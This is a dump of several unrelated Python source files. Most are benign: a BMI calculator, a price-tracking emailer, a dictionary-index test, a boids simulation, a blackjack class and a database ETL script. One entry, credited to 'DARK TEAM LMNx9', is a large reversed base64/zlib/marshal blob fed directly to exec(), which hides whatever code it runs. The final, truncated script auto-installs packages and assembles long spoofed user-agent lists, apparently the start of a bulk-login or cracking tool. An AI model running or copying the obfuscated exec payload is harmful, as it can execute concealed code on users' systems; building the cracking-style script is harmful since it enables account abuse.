print(colored(f'Bmi your body :~$ {bmi}', color='magenta'))\n                print(colored('==============================', color='white'))\n                print(colored('Condition :~# ', color='cyan'))\n                print(colored(figlet_format('Overweight 3'), color='red'))\n                print(colored('==============================', color='white'))\n\n            # Overweight\n            elif bmi >= 40:\n                print(colored(f'Bmi your body :~$ {bmi}', color='magenta'))\n                print(colored('==============================', color='white'))\n                print(colored('Condition :~# ', color='cyan'))\n                print(colored(figlet_format('Overweight 4'), color='red'))\n                print(colored('==============================', color='white'))\n\n            # Please enter the correct values\n            else:\n                print(colored('Please enter the correct values !'))\n\n            print(colored('==============================', color='yellow'))\n\n            # Continues\n            Continue_e = input('Try Again (y/n) :~$ ')\n            if Continue_e == 'n' or Continue_e == 'N':\n                break\n\n            elif Continue_e == 'y' or Continue_e == 'Y':\n                continue\n\n            else:\n                print(colored('Please Enter The Y Or N Character, By Default Break Proramming', color='red'))\n                break\n\n    # Except For Programming\n    except:\n        print(colored('Please Try again !', color='blue'))\n\n\n# call Function's main\nif __name__ == '__main__':\n    main()\n\nelse:\n    print(colored(\"You Can't Imported This program\", color='red'))\n\n# Create By Moein Heshmati\n# Finish",
    "#--------------------------------------------------\n#--------DARK TEAM LMNx9--------\n#--------------------------------------------------\n#Encoder : LIMON HOSSAIN\n#Facebook : LJ.LMNx9\n#GitHub : LMNx9-JOHNY\n#Telegram : DARK_LMNx999\n#--------------------------------------------------\n\n\n_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==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",
    "import requests   #To access a URL and pull out data from the site\r\nfrom bs4 import BeautifulSoup\r\nimport smtplib\r\nimport time\r\n\r\nURL = \"https://www.amazon.co.uk/Veno-Scorp-Gaming-Bundle-Set/dp/B0BDMV65L3/ref=sr_1_4?crid=26JIKCFTS05W2&dib=eyJ2IjoiMSJ9.n-kGti1DZUbAdS_Gc8KlJ2Mtii3nTeb3eK_dScGen4bTYc_VGqMUKl_7sxA0ijW_UQD8TsGkj2RKJ3hon_coH_Q-iuUIpij4eaAivMVsvg_W5ovmZZKaR_MEJkDpg0mLWgs-Q-PcfMH_XrkWxWAItnfcITEJ25NuHXjsEu-djy42eCW6hfI5L6ylOXf66u3FSF6OiuYG2unpDO5vZQxhHl6OWFszI8Mm2VvTWfeNnaA.YH9ZA_dqprXbzhY5Uw9PofRjTWs68GNbdYFcj2zPLWc&dib_tag=se&keywords=pc+coding&qid=1712952315&sprefix=pc+coding%2Caps%2C245&sr=8-4\"\r\n\r\nheaders = {\"User-Agent\" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0'}\r\n#Gives us info on our broswer\r\n\r\ndef check_price():\r\n\r\n    page = requests.get(URL, headers=headers)\r\n\r\n    soup = BeautifulSoup(page.content, 'html.parser') #To pull out individual data\r\n\r\n    title = soup.find(id = \"productTitle\").get_text()\r\n    price = soup.find(class_= \"a-price-whole\").get_text()\r\n    converted_price = float(price[0:5])\r\n\r\n    if converted_price < 1.700:\r\n        send_mail()\r\n\r\n    print(converted_price)\r\n    print(title.strip())\r\n    \r\n    if converted_price > 1.700:\r\n        send_mail()\r\n    \r\ndef send_mail():\r\n    server = smtplib.SMTP('smtp.gmail.com', 587)\r\n    server.ehlo()\r\n    server.starttls()\r\n    server.ehlo()\r\n    \r\n    server.login('username@gmail.com', 'password')\r\n    \r\n    subject = 'Price fell down'\r\n    body = 'check the amazon link https://www.amazon.co.uk/Veno-Scorp-Gaming-Bundle-Set/dp/B0BDMV65L3/ref=sr_1_4?crid=26JIKCFTS05W2&dib=eyJ2IjoiMSJ9.n-kGti1DZUbAdS_Gc8KlJ2Mtii3nTeb3eK_dScGen4bTYc_VGqMUKl_7sxA0ijW_UQD8TsGkj2RKJ3hon_coH_Q-iuUIpij4eaAivMVsvg_W5ovmZZKaR_MEJkDpg0mLWgs-Q-PcfMH_XrkWxWAItnfcITEJ25NuHXjsEu-djy42eCW6hfI5L6ylOXf66u3FSF6OiuYG2unpDO5vZQxhHl6OWFszI8Mm2VvTWfeNnaA.YH9ZA_dqprXbzhY5Uw9PofRjTWs68GNbdYFcj2zPLWc&dib_tag=se&keywords=pc+coding&qid=1712952315&sprefix=pc+coding%2Caps%2C245&sr=8-4'\r\n    \r\n    msg = f\"Subject : {subject}\\n\\n{body}\"\r\n    \r\n    server.sendmail(\r\n        'sender@gmail.com',\r\n        'recipient@gmail.com',\r\n        msg\r\n        )\r\n    print('Hey EMAIL has been sent')\r\n    \r\n    server.quit()\r\n    \r\nwhile True:\r\n    print(check_price())\r\n    time.sleep(60 * 60 * 60)",
    "from mdict_query import IndexBuilder\nimport unittest\nimport os\nimport glob\nimport time\nfrom timeit import timeit\n\nclass TestMdict(unittest.TestCase):\n\n    _mdx_file = glob.glob(\"mdx/Vocabulary*.mdx\")[0]\n    _repeat = 100\n    # remove existing db\n    for f in glob.glob(\"mdx/Vocabulary*.db\"):\n        os.remove(f)\n     \n    def test_builder_noindex(self):\n        '''test basic function'''\n        for f in glob.glob(\"mdx/Vocabulary*.db\"):\n            os.remove(f)\n        print(\"***without sql index***\\n\")\n        start = time.time() \n        bd = IndexBuilder(self._mdx_file, sql_index = False, check = True)\n        print(\"takes {0} seconds to build without sql index\\n\".format(time.time() - start))         \n        \n        start = time.time()\n        word = 'dedicate'\n        for i in range(self._repeat):\n            self.assertTrue(bd.mdx_lookup(word))\n        print(\"takes {0} second to lookup {1} {2} times\\n\".format(time.time() - start, word, self._repeat))\n        for i in range(self._repeat):\n            bd.get_mdx_keys(\"dedi*\")\n        print(\"takes {0} second to lookup {1} {2} times\\n\".format(time.time() - start, \"dedi*\", self._repeat))\n         \n    def test_builder_index(self):\n        '''test basic function'''\n        for f in glob.glob(\"mdx/Vocabulary*.db\"):\n            os.remove(f)\n        print(\"***with sql index***\\n\")\n        start = time.time() \n        bd = IndexBuilder(self._mdx_file, sql_index = True, check = False)\n        print(\"takes {0} seconds to build with sql index\\n\".format(time.time() - start))\n         \n        start = time.time()\n        word = 'dedicate'\n        for i in range(self._repeat):\n            bd.mdx_lookup(word)\n        print(\"takes {0} second to lookup {1} {2} times\\n\".format(time.time() - start, word, self._repeat))\n\n        for i in range(self._repeat):\n            bd.get_mdx_keys(\"dedi*\")\n        print(\"takes {0} second to lookup {1} {2} times\\n\".format(time.time() - start, \"dedi*\", self._repeat))\n \n\nif __name__ == '__main__':\n        unittest.main()",
    "import math\r\n\r\nimport numpy as np\r\nfrom numba import njit, prange\r\n\r\n\r\ndef init_boids(boids: np.ndarray, asp: float, vrange: tuple[float, float]):\r\n    \"\"\"\r\n        Initialize the boids with random positions and velocities.\r\n\r\n        Args:\r\n        - boids (np.ndarray): Array representing the boids with shape (N, 6) where N is the number of boids.\r\n                              Each row represents a boid with the following columns:\r\n                              [x_position, y_position, x_velocity, y_velocity, x_acceleration, y_acceleration]\r\n        - asp (float): Aspect ratio of the simulation area (width/height).\r\n        - vrange (tuple[float, float]): Range of initial velocities for the boids.\r\n\r\n        Returns:\r\n        None\r\n        \"\"\"\r\n    n = boids.shape[0]\r\n    rng = np.random.default_rng()\r\n    boids[:, 0] = rng.uniform(0., asp, size=n)\r\n    boids[:, 1] = rng.uniform(0., 1., size=n)\r\n    alpha = rng.uniform(0, 2 * np.pi, size=n)\r\n    v = rng.uniform(*vrange, size=n)\r\n    c, s = np.cos(alpha), np.sin(alpha)\r\n    boids[:, 2] = v * c\r\n    boids[:, 3] = v * s\r\n\r\n@njit()\r\ndef nor(arr: np.ndarray):\r\n    \"\"\"\r\n        Compute the norm of each vector in the given array.\r\n\r\n        Args:\r\n        - arr (np.ndarray): Input array of vectors with shape (N, 2) where N is the number of vectors.\r\n\r\n        Returns:\r\n        np.ndarray: Array containing the norms of each vector.\r\n        \"\"\"\r\n    return np.sqrt(np.sum(arr ** 2, axis=1))\r\n\r\n\r\n@njit()\r\ndef median(arr, axis):\r\n    \"\"\"\r\n        Compute the median along the specified axis.\r\n\r\n        Args:\r\n        - arr (np.ndarray): Input array.\r\n        - axis (int): Axis along which to compute the median (0 for columns, 1 for rows).\r\n\r\n        Returns:\r\n        np.ndarray: Array containing the median values along the specified axis.\r\n        \"\"\"\r\n    assert arr.ndim == 2, \"Input array must be 2D.\"\r\n    assert axis in (0, 1), \"Axis must be 0 or 1.\"\r\n\r\n\r\n    if axis == 0:\r\n        result_size = arr.shape[1]\r\n    else:\r\n        result_size = arr.shape[0]\r\n\r\n    result = np.empty(result_size, dtype=arr.dtype)\r\n    if axis == 0:\r\n        for i in range(result_size):\r\n            result[i] = np.median(arr[:, i])\r\n    else:\r\n        for i in range(result_size):\r\n            result[i] = np.median(arr[i, :])\r\n    return result\r\n\r\n\r\n@njit()\r\ndef directions(boids: np.ndarray, dt: float) -> np.ndarray:\r\n    \"\"\"\r\n        Compute the next positions of the boids based on their velocities.\r\n\r\n        Args:\r\n        - boids (np.ndarray): Array representing the boids with shape (N, 6).\r\n        - dt (float): Time step.\r\n\r\n        Returns:\r\n        np.ndarray: Array containing the next positions of the boids.\r\n        \"\"\"\r\n    return np.hstack((\r\n        boids[:, :2] - dt * boids[:, 2:4],\r\n        boids[:, :2]\r\n    ))\r\n\r\n\r\n@njit()\r\ndef clip_mag(arr: np.ndarray,\r\n             lims: tuple[float, float] = (0., 1.)):\r\n    \"\"\"\r\n        Clip the magnitudes of vectors in the given array to a specified range.\r\n\r\n        Args:\r\n        - arr (np.ndarray): Input array of vectors with shape (N, 2).\r\n        - lims (tuple[float, float]): Lower and upper bounds for the magnitudes.\r\n\r\n        Returns:\r\n        None\r\n        \"\"\"\r\n    v = nor(arr)\r\n    mask = v > 0\r\n    v_clip = np.clip(v, *lims)\r\n    arr[mask] *= (v_clip[mask] / v[mask]).reshape(-1, 1)\r\n\r\n@njit()\r\ndef propagate(boids: np.ndarray, dt: float, vrange: tuple[float, float]):\r\n    \"\"\"\r\n        Propagate the boids based on their velocities and accelerations.\r\n\r\n        Args:\r\n        - boids (np.ndarray): Array representing the boids with shape (N, 6).\r\n        - dt (float): Time step.\r\n        - vrange (tuple[float, float]): Range of allowed velocities for the boids.\r\n\r\n        Returns:\r\n        None\r\n        \"\"\"\r\n    boids[:, 2:4] += dt * boids[:, 4:6]\r\n    clip_mag(boids[:, 2:4], vrange)\r\n    boids[:, 0:2] += dt * boids[:, 2:4]\r\n\r\n\r\n@njit(parallel=True)\r\ndef distances(boids: np.ndarray, perception: float, perception_angle: float) -> np.ndarray:\r\n    \"\"\"\r\n        Compute pairwise distances between boids within perception range and angle.\r\n\r\n        Args:\r\n        - boids (np.ndarray): Array representing the boids with shape (N, 6).\r\n        - perception (float): Maximum distance for boids to perceive each other.\r\n        - perception_angle (float): Field of view angle for boids.\r\n\r\n        Returns:\r\n        np.ndarray: Array containing pairwise distances between boids.\r\n        \"\"\"\r\n    n = boids.shape[0]\r\n    D = np.empty((n, n), dtype=np.float64)\r\n\r\n    for i in prange(n):\r\n        for j in prange(n):\r\n            delta = boids[i, :2] - boids[j, :2]\r\n            distance = np.sqrt(delta @ delta)\r\n\r\n            direction = np.arctan2(boids[i, 3], boids[i, 2])\r\n            angle_to_neighbor = np.arctan2(delta[1], delta[0]) - direction\r\n            angle_to_neighbor = (angle_to_neighbor + np.pi) % (2 * np.pi) - np.pi  # \u041d\u043e\u0440\u043c\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0443\u0433\u043b\u0430 \u0432 \u0434\u0438\u0430\u043f\u0430\u0437\u043e\u043d [-\u03c0, \u03c0]\r\n\r\n            if distance < perception and -perception_angle / 2 <= angle_to_",
    "from card import Card\n\n\nclass Player:\n    def __init__(self):\n        self.hand: list[Card] = []\n\n    def add_card(self, card: Card):\n        \"\"\"\n        Aces go to the end of the hand, \n        while any other card to the beginning\n        \"\"\"\n        if card.number == \"A\":\n            self.hand.append(card)\n        else:\n            self.hand.insert(0, card)\n\n    def total_hand_value(self) -> int:\n        total: int = 0\n        count: int = 0\n        ACE_BIG_VALUE = 11\n        cards_in_hand = len(self.hand)\n        for card in self.hand:\n            count += 1\n            if card.number.isdigit():\n                total += int(card.number)\n            elif card.number in [\"J\", \"Q\", \"K\"]:\n                total += 10\n            else:\n                # processing Aces\n                cards_remaining = cards_in_hand - count\n                if total < ACE_BIG_VALUE - cards_remaining:\n                    total += ACE_BIG_VALUE\n                else:\n                    total += 1\n        return total\n    ",
    "import cx_Oracle\nimport pandas as pd\nimport sqlalchemy \nfrom config import config\n\n# SET conection configuration\nacces_config = config['development']\n\n# EXTRACT\n############\n\n#source_connection = cx_Oracle.connect('mneira/mneira@localhost:1521/XEPDB1')\nsource_connection = cx_Oracle.connect(\n    user=acces_config.DB_SOURCE_USERNAME,\n    password=acces_config.DB_SOURCE_PASSWORD,\n    dsn=acces_config.DB_SOURCE_DSN,\n    encoding=acces_config.DB_SOURCE_ENCODING\n)\n\nquery = ('SELECT s.sale_id, s.client_id, p.product_id, p.product_name, c.first_name, c.last_name, p.category, s.sale_date, s.total_price '\n ' FROM sale s'\n ' JOIN client c ON (s.client_id = c.client_id)'\n ' JOIN product p ON (s.product_id = p.product_id)' )\ndf = pd.read_sql(query, source_connection)\nsource_connection.close()\n\n# Show DataFrame\nprint(\"Original Data Frame\")\nprint(df)\n\n#TRANSFORMATION 1\n#################\n\ndf['YEAR_SALE'] = df['SALE_DATE'].dt.year\ndf['MONTH_SALE'] = df['SALE_DATE'].dt.month\ndf['CLIENT_NAME'] = df['FIRST_NAME'].str.cat(df['LAST_NAME'], sep=' ')\ndf = df.drop(columns=['SALE_DATE'])\ndf = df.drop(columns=['FIRST_NAME'])\ndf = df.drop(columns=['LAST_NAME'])\n\n#LOAD #1 - ORACLE - Sales Summary\n\n# set new table\nt1_table_name = 'sales_summary'\n#engine = sqlalchemy.create_engine('oracle+cx_oracle://mneira:mneira@localhost:1521/?service_name=XEPDB1')\nengine_t1 = sqlalchemy.create_engine(\n    \"oracle+cx_oracle://\",\n    connect_args={\n        \"user\": acces_config.DB_T1_USERNAME,\n        \"password\": acces_config.DB_T1_PASSWORD,\n        \"dsn\": acces_config.DB_T1_DSN,\n        \"encoding\": acces_config.DB_T1_ENCODING\n    }\n)\n\n# set float fields\ndtype = {'TOTAL_PRICE': sqlalchemy.Float}\ndf.to_sql(t1_table_name, con=engine_t1, if_exists='replace', index=False, dtype=dtype)\nengine_t1.dispose()\n\n# Show Data Frame\nprint(\"Sales Summary Data Frame\")\nprint(df)\n\n\n\n# LOAD #2 - MySQL - Product Summary\n###################################\n\n# TRANSFORMATION LOAD #2\ndf_product = df.groupby(['PRODUCT_ID', 'PRODUCT_NAME', 'CATEGORY']).agg({'TOTAL_PRICE': ['sum', 'count']}).reset_index()\ndf_product.columns = ['PRODUCT_ID', 'PRODUCT_NAME', 'CATEGORY', 'TOTAL_PRICE_SUM', 'PRODUCT_COUNT']\n\n# Load #2\n#mysql_engine = sqlalchemy.create_engine('mysql://report_app:report@localhost:3307/reports')\nengine_t2 = sqlalchemy.create_engine(\n    \"mysql+mysqlconnector://\",\n    connect_args={\n        \"user\": acces_config.DB_T2_USERNAME,\n        \"password\": acces_config.DB_T2_PASSWORD,\n        \"host\": acces_config.DB_T2_HOST,\n        \"port\": acces_config.DB_T2_PORT,\n        \"database\": acces_config.DB_T2_DB\n    }\n)\nt2_table_name = 'product_summary'\ndf_product.to_sql(t2_table_name, con=engine_t2, if_exists='replace', index=False, dtype=dtype)\nengine_t2.dispose()\n\n# Show Data Frame\nprint(\"Product Summary Data Frame\")\nprint(df_product)\n\n\n# LOAD #3 - MySQL - Category Summary\n####################################\n\n# TRANSFORMATION LOAD #3\ndf_categpry = df.groupby(['YEAR_SALE','CATEGORY']).agg({'TOTAL_PRICE': ['sum', 'count']}).reset_index()\ndf_categpry.columns = ['YEAR_SALE', 'CATEGORY', 'TOTAL_PRICE_SUM', 'SALES_COUNT']\n\n# Load #3\nengine_t3 = sqlalchemy.create_engine(\n    \"mysql+mysqlconnector://\",\n    connect_args={\n        \"user\": acces_config.DB_T3_USERNAME,\n        \"password\": acces_config.DB_T3_PASSWORD,\n        \"host\": acces_config.DB_T3_HOST,\n        \"port\": acces_config.DB_T3_PORT,\n        \"database\": acces_config.DB_T3_DB\n    }\n)\nt3_table_name = 'category_summary'\ndf_categpry.to_sql(t3_table_name, con=engine_t3, if_exists='replace', index=False, dtype=dtype)\nengine_t3.dispose()\n\n# Show Data Frame\nprint(\"Category Summary Data Frame\")\nprint(df_categpry)\n\n",
    "W = '\\033[97;1m'\nR = '\\033[91;1m'\nG = '\\033[92;1m'\nY = '\\033[93;1m'\nB = '\\033[94;1m'\nP = '\\033[95;1m'\nC = '\\033[96;1m'\nN = '\\x1b[0m'\nimport os\ntry:\n\timport requests\nexcept ImportError:\n\tos.system(\"pip install requests\")\n \ntry:\n\timport concurrent.futures\nexcept ImportError:\n\tos.system(\"pip install futures\")\n \nimport os\nimport sys\nimport time\nimport requests\nimport random\nimport platform\nimport base64\nimport subprocess\nfrom concurrent.futures import ThreadPoolExecutor\nimport requests,bs4,uuid,json,os,sys,random,datetime,time,re,subprocess\ntry:\n\timport rich\nexcept ImportError:\n\tos.system('pip install rich')\n\ttime.sleep(1)\n\ttry:\n\t\timport rich\n\texcept ImportError:\n\t\texit(' [\u00d7] Cant Install Rich Module, Try Manual Install (pip install rich)')\nfrom rich.table import Table as me\nfrom rich.console import Console as sol\nfrom bs4 import BeautifulSoup as sop\nfrom concurrent.futures import ThreadPoolExecutor as tred\nfrom rich.console import Group as gp\nfrom rich.panel import Panel as nel\nimport base64\nfrom rich import print as cetak\nfrom rich.markdown import Markdown as mark\nfrom rich.columns import Columns as col\nfrom urllib.parse import quote\n# UA LIST\n#ugen2=open('frec.txt','r').read().splitlines()\n#ugen=open('m.txt','r').read().splitlines()\nugen2=['Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser','Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser']\nugen=['Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 1\u2026', '[18.36, 15/3/2022] AOREC: Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SCV45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; en-au; SC-04L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N980F/N980FXXU1DUB5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N/KSU1FUCD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-G988B/G988BXXU7DUC7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-A8050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG IN2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SC-42A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T597W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG 